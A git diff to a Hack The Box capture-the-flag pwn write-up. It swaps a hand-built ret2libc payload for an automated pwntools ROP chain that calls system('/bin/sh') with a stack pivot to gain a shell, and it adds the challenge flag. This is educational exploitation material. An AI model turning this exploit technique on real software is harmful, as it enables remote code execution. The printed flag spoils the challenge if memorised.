@@ -421,7 +421,7 @@ sh.interactive()
 
 11. All good, let's send our ret2libc payload along with our stack pivot.
 
-### GETTING RCE
+### GETTING RCE | ADDED A ROPSTAR SCRIPT FOR BETTER AUTOMATION
 
 ```py
 from pwn import *
@@ -521,14 +521,25 @@ ret_addr = rop.find_gadget(['ret'])[0]
 log.success(f'ret gadget --> {ret_addr}')
 
 ## RET2LIBC PAYLOAD
-payload = flat([
-    asm('nop') * padding,
-    ret_addr,
-    rdi_gadget,
-    next(libc.search(b'/bin/sh\x00')),
-    libc.sym['system'],
-    sub_rsp_gadget
-])
+# payload = flat([
+#     asm('nop') * padding,
+#     ret_addr,
+#     rdi_gadget,
+#     next(libc.search(b'/bin/sh\x00')),
+#     libc.sym['system'],
+#     sub_rsp_gadget
+# ])
+
+## USING ROPSTAR
+libcrop = ROP(libc)
+libcrop.call(rop.find_gadget(['ret'])[0])
+libcrop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
+libcrop.call(sub_rsp_gadget)
+payload = asm('nop') * 40 
+payload += libcrop.chain()
+log.info(libcrop.dump())
+print(payload)
+
 sh.sendlineafter(b':', payload)
 
 sh.interactive()
@@ -536,13 +547,19 @@ sh.interactive()
 
 > RESULT IN LOCAL
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2fbd1fe3-00a7-4428-97dd-523ba3aff9fa)
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c99fd181-398b-4751-9e22-d60b77a7ed99)
 
 
 > TEST REMOTELY
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7abaa452-f80f-49e3-a705-25df86327238)
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bc3bc14a-7ebf-4d57-81f6-b9ba284b40ff)
 
+
+## FLAG
+
+```
+HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
+```
 
 
 
